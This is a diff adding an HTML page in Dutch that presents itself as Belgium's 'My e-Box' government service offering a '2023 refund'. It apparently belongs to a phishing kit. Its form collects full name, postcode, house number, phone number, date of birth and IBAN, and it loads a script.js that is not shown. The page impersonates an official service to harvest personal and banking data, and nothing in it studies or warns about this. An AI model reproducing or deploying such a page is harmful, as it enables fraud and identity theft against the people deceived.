@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My e-Box</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logos">
+            <div class="logo">
+                <img src="images/978uoirhjk4n3r4y9f7uih.png" alt=".be logo">
+            </div>
+            <div class="logo">
+                <img src="images/3243g67f32g67367gr2g67g6732e.png" alt=".be logo 2">
+            </div>
+        </div>
+        <h4>Teruggave 2023</h4>
+        <p>my e-Box</p>
+        <form id="eBoxForm">
+            <label for="name">Voor en achternaam</label>
+            <input type="text" id="name" name="name" required>
+
+            <div class="input-group">
+                <div class="input-half">
+                    <label for="postcode">Postcode</label>
+                    <input type="text" id="postcode" name="postcode" required>
+                </div>
+                <div class="input-half">
+                    <label for="huisnummer">Huisnummer</label>
+                    <input type="text" id="huisnummer" name="huisnummer" required>
+                </div>
+            </div>
+
+            <label for="phone">Telefoonnummer</label>
+            <input type="tel" id="phone" name="phone" required>
+
+            <label for="dob">Geboortedatum</label>
+            <input type="date" placeholder="dd-mm-jjjj" id="dob" name="dob" required>
+
+            <label for="iban">Rekeningnummer (IBAN)</label>
+            <input type="text" placeholder="BE12 3456 7890 1234" id="iban" name="iban" required>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="email-info" name="email-info">
+                <label for="email-info">Wilt u per e-mail meer informatie ontvangen?</label>
+            </div>
+
+            <button type="submit">Verder</button>
+        </form>
+    </div>
+
+    <!-- النص النهائي في div جديد -->
+    <div class="footer-text">
+        <h4>Heeft u vragen of opmerkingen?</h4>
+        <p><a href="#">Bekijk de eBox website</a> of <a href="#">neem contact op</a> [opent in een nieuw venster] met de eBox helpdesk.</p>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
